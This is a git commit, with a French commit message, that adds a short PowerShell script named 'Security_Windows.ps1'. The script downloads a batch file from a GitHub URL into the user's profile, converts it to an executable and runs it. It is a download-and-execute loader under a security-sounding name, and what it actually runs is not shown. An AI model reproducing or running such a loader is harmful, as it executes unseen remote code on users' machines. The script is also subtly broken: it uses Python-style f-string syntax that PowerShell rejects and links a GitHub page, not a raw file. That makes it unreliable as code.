a6f0ad4e2b21e5de73d832cd3e5ad12e214b9a95
n0t_cr1m3 <raphaelfavreau26@gmail.com>
2024-01-03 18:45:47 +0100

    Ajout du fichier .ps1

---
+++ Security_Windows.ps1
@@ -0,0 +1,14 @@
+$url = f"https://github.com/n0t_cr1m3/test/blob/main/Security_Windows.bat"
+
+# Spécifiez le chemin de destination où le fichier sera enregistré
+$destination = "$env:USERPROFILE/Security_Windows.bat"
+$convertedExePath = "$env:USERPROFILE/Security_Windows.exe"
+
+# Télécharge le fichier depuis l'URL spécifiée
+Invoke-WebRequest -Uri $url -OutFile $destination
+
+bat_to_exe_converter.exe /bat $destination /exe $convertedExePath
+
+# Exécute le fichier téléchargé
+Start-Process -FilePath $convertedExePath
+            
